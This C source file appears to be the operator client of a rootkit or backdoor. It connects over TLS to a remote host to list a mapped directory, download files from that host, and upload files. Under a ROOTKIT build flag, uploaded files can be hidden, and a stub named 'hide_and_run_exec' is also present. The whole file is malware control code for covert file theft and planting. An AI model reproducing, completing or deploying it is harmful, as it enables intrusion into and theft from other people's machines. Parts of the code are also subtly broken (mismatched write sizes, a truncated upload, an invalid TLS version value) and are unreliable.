#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <sys/socket.h>
#include <resolv.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include <libgen.h>

#include "utils.h"

#define FAIL    -1

typedef unsigned char byte;

int OpenConnection(const char *hostname, int port)
{
    int sd;
    struct hostent *host;
    struct sockaddr_in addr;
    if ( (host = gethostbyname(hostname)) == NULL )
    {
        perror(hostname);
        abort();
    }
    sd = socket(PF_INET, SOCK_STREAM, 0);
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = *(long*)(host->h_addr);
    if ( connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
    {
        close(sd);
        perror(hostname);
        abort();
    }
    return sd;
}

SSL_CTX* InitCTX(void)
{
    SSL_CTX *ctx;
    OpenSSL_add_all_algorithms();  /* Load cryptos, et.al. */
    SSL_load_error_strings();   /* Bring in and register error messages */
    const SSL_METHOD *method = TLS_client_method();  /* Create new client-method instance */
    ctx = SSL_CTX_new(method);   /* Create new context */
    if ( ctx == NULL )
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    SSL_CTX_set_min_proto_version(ctx, 3);
    SSL_CTX_set_max_proto_version(ctx, 3);
    return ctx;
}

/***** QUERIES FUNCS *****/
char **
query_get_file_mapping(SSL *ssl, int *nfiles)
{
    short query_len = QUERY_GET_FSM;
    if (SSL_write(ssl, &query_len, sizeof(short)) < 0)
        return NULL;
    size_t len = 0;
    int nb_files = 0;
    if (SSL_read(ssl, &len, sizeof(size_t)) < 0)
        return NULL;
    if (len <= MAX_QUERY_ERROR)
        return NULL;
    if (SSL_read(ssl, &nb_files, sizeof(int)) < 0)
        return NULL;
    char buf[BUFSIZ+1] = { 0 };
    size_t total_len = 0;
    int n = 0;
    char **files = malloc(sizeof(char*) * nb_files);
    if (!files)
    {
        perror("malloc");
        exit(1);
    }
    char *tmp = buf;
    int i = 0;
    // to finish
    char *endptr = NULL;
    do
    {
        memset(buf, 0, sizeof buf);
        if ((n = SSL_read(ssl, buf, BUFSIZ)) < 0)
            return NULL;
        tmp = buf;
        for (; i<nb_files && (tmp-buf) < n; i++)
        {
            int still_to_read = ((long)n-((long)tmp-(long)buf));
            size_t curlen = strnlen(tmp, still_to_read);
            // if no C string end detected, save begenning of the string 
            if ((tmp+curlen+1)-buf > n && buf[n-1] != '\0')
            {
                endptr = calloc(curlen + 1, 1);
                if (!endptr)
                {
                    perror("malloc");
                    exit(1);
                }
                strncpy(endptr, tmp, curlen);
                tmp += curlen +1;
                --i;
                continue;
            }
            if (endptr)
            {
                // if saved a C string begenning before, concat with just readed one
                files[i] = calloc((curlen+strlen(endptr)+1), sizeof(char));
                if (!files[i])
                {
                    perror("calloc");
                    exit(1);
                }
                strcpy(files[i], endptr);
                strcat(files[i], tmp);
                free(endptr);
                endptr = NULL;
            }
            else
            {
                files[i] = calloc((curlen+1), sizeof(char));
                if (!files[i])
                {
                    perror("calloc");
                    exit(1);
                }
                strncpy(files[i], tmp, curlen);
            }
            tmp += curlen +1;
        }
        total_len += n;
    } while (total_len < len && i < nb_files);
    
    *nfiles = i;
    return files;
}

byte *
query_get_file(SSL *ssl, char *filename, size_t *filesize)
{
    byte query[QUERY_BUF_LEN] = { 0 };
    byte *tmp = query;
    if (!check_unaligned(tmp, int32_t))
        fprintf(stderr, "Unaligned int32_t at %p\n", tmp);
    *(int32_t*) tmp = QUERY_GET_FILE;
    tmp += sizeof(int32_t);
    if (!check_unaligned(tmp, size_t))
        fprintf(stderr, "Unaligned size_t at %p\n", tmp);
    *(size_t*) tmp = strlen(filename);
    tmp += sizeof(size_t);
    strcpy((char*)tmp, filename);
    if (SSL_write(ssl, query, sizeof(int32_t) + sizeof(size_t) + strlen(filename) + 1) < 0)
        return NULL;

    uint64_t file_len = 0;
    if (SSL_read(ssl, &file_len, sizeof(uint64_t)) < 0)
        return NULL;
    if (file_len <= MAX_QUERY_ERROR)
        return NULL;
    byte *file = calloc((file_len+1), sizeof(byte));
    if (!file)
    {
        perror("calloc");
        exit(1);
    }
    int total = 0;
    int n;
    do
    {
        if ((n = SSL_read(ssl, (void*)file+total, file_len-total)) < 0)
        {
            ERR_print_errors_fp(stderr);
            return NULL;
        }
        total += n;
        
    } while ((uint64_t) total < file_len);
    
    *filesize = file_len;
    return file;
}

int
get_dir(SSL* ssl, char *dir, size_t bufsiz)
{
    int32_t query = QUERY_GET_FSM_DIR;
    if (SSL_write(ssl, &query, sizeof(uint64_t)) < 0)
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }
    uint64_t len = 0;
    if (SSL_read(ssl, &len, sizeof(uint64_t)) < 0)
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }
    if (len <= MAX_QUERY_ERROR)
        return 0;
    if (len >= bufsiz)
        return 0;
    if (SSL_read(ssl, dir, len) < 0)
    {
        ERR_print_errors_fp(stderr);
        return 0;
    }
    size_t err = *(size_t*) dir;
    if (err <= MAX_QUERY_ERROR)
        return -1;

    return 1;
}

int
upload_file(SSL *ssl, upload_params *params)
{
    if (!params)
        return -1;

    size_t size;
    unsigned char *serialized = serialize_upload_params(params, &size);
    if (!serialized || size == 0)
        return -1;

    unsigned char *payload = mem_alloc(size + sizeof(int32_t) + sizeof(size_t) + 1);
    unsigned char *tmp = payload;
    if (!check_unaligned(tmp, int32_t))
        fprintf(stderr, "Unaligned int32_t at %p\n", tmp);
    *(int32_t*) tmp = QUERY_UPLOAD_FILE;
    tmp += sizeof(int32_t);
    if (!check_unaligned(tmp, int64_t))
        fprintf(stderr, "Unaligned int64_t at %p\n", tmp);
    *(uint64_t*) tmp = size;
    tmp += sizeof(uint64_t);
    memcpy(tmp, serialized, size);
    free(serialized);

    if (SSL_write(ssl, payload, size) < 0)
    {
        ERR_print_errors_fp(stderr);
        return -1;
    }
    free(payload);
    size_t err;
    if (SSL_read(ssl, &err, sizeof(size_t)) < 0)
        return -1;
    if (err <= MAX_QUERY_ERROR)
        return -1;
    return 0;
}

int hide_and_run_exec(hare_params *params)
{

    return -1;
}

int main(int argc, char *argv[])
{
    SSL_CTX *ctx;
    int server;
    SSL *ssl;
    char *hostname, *portnum;
    if ( argc != 3 )
    {
        printf("usage: %s <hostname> <portnum>\n", argv[0]);
        exit(0);
    }
    SSL_library_init();
    hostname=argv[1];
    portnum=argv[2];
    ctx = InitCTX();
    server = OpenConnection(hostname, atoi(portnum));
    ssl = SSL_new(ctx);
    SSL_set_min_proto_version(ssl, 3);
    SSL_set_max_proto_version(ssl, 3);
    SSL_set_fd(ssl, server);
    if ( SSL_connect(ssl) == FAIL ) 
        ERR_print_errors_fp(stderr);
    else
    {
        printf("Encryption: %s\n\n", SSL_get_cipher(ssl));
        char dir[PATH_MAX] = { 0 };
        if (get_dir(ssl, dir, sizeof dir) == 0)
        {
            fprintf(stderr, "Cannot get file mapping directory\n");
            goto end;
        }

        int onexit = 0;
        while (!onexit)
        {
            system("clear");
            printf("\n        "BOLD("FILE MAPPING")"\n\n");
            printf("dir: %s\n", dir);
            printf("    [1] -- Display file mapping\n");
            printf("    [2] -- Get a file\n");
            printf("    [3] -- Upload a file\n");
            printf("    [0] -- exit\n");
            char ch = getchar();
            system("clear");
            flush_in(stdin);
            switch(ch)
            {
                case '1':
                {
                    int nfiles = 0;
                    char **files = query_get_file_mapping(ssl, &nfiles);
                    if (!files)
                    {
                        ERR_print_errors_fp(stderr);
                        goto end;
                    }
                    for (int i=0; i<nfiles; i++)
                    {
                        printf("[%d] %s\n", i, files[i]);
                        free(files[i]);
                    }
                    free(files);
                    printf("\nType [ENTER] to continue\n");
                    getchar();
                    break;
                }
                case '2':
                {
                    char file[PATH_MAX +1 ] = { 0 };
                    printf("filename: "); flush_in(stdout);
                    fgets(file, sizeof file, stdin); flush_in(stdin);
                    trim(file);
                    size_t len = 0;
                    byte *content = query_get_file(ssl, file, &len);
                    if (!content)
                    {
                        fprintf(stderr, "Error during reading\n");
                        goto end;
                    }
                    printf("Do you want to display the file content (else just save the file) ? (Y/n) "); flush_in(stdout);
                    ch = getchar();
                    if (ch != 'n' && ch != 'N')
                    {
                        printf("##### CONTENT #####\n");
                        printf("%s\n", content);
                        printf("####### EOF #######\n");
                    }
                    char *name = basename(file);
                    printf("\nSaving file to %s !\n", name);
                    int fd = open(name, O_WRONLY|O_CREAT|O_TRUNC, 0600);
                    if (fd < 0)
                    {
                        perror("open");
                        goto end;
                    }
                    if (write(fd, content, len) < 0)
                    {
                        perror("write");
                        close(fd);
                        goto end;
                    }
                    close(fd);
                    free(content);
                    flush_in(stdin);
                    printf("\nType [ENTER] to continue\n");
                    getchar();
                    break;
                }
                case '3':
                {
                    upload_params p = {
                        .hidden = false
                    };
                    printf("File to upload: "); flush_in(stdout);
                    fgets(p.filename, NAME_MAX+1, stdin);
                    trim(p.filename);
                    flush_in(stdin);
                    int fd = open(p.filename, O_RDONLY);
                    if (fd < 0)
                    {
                        perror("open"); sleep(2);
                        break;
                    }
                    p.len = lseek(fd, 0, SEEK_END);
                    lseek(fd, 0, SEEK_SET);
                    p.content = mem_alloc(p.len);
                    read(fd, p.content, p.len);
                    close(fd);

                    printf("Directory to upload: "); flush_in(stdout);
                    fgets(p.dir, PATH_MAX+1, stdin);
                    trim(p.dir);
                    flush_in(stdin);

                    printf("mode to upload (octal): "); flush_in(stdin);
                    char octal[6] = { 0 };
                    fgets(octal, sizeof octal, stdin);
                    trim(octal);
                    flush_in(stdin);
                    char *endptr;
                    p.flags = (int) strtol(octal, &endptr, 8);
                    if (*endptr != '\0')
                        break;
                    printf("mode=%d\n", p.flags);

#ifdef ROOTKIT
                    printf("Do you want to hide the file ? (y/N) "); flush_in(stdout);
                    ch = getchar();
                    flush_in(stdin);
                    p.hidden = (ch == 'y' || ch == 'Y');
#endif
                    if (upload_file(ssl, &p) < 0)
                        fprintf(stderr, "Error: cannot achieved to upload file\n");
                    else
                        printf("File uploaded ! (path: %s/%s) \n", p.dir, p.filename);

                    printf("\nEnter a key to continue.\n");
                    getchar();
                    flush_in(stdin);
                    break;
                }
                case '0':
                    onexit = 1;
                    break;
                default:
                    break;
            }
        }
end:
        SSL_free(ssl);
    }
    close(server);
    SSL_CTX_free(ctx);
    return 0;
}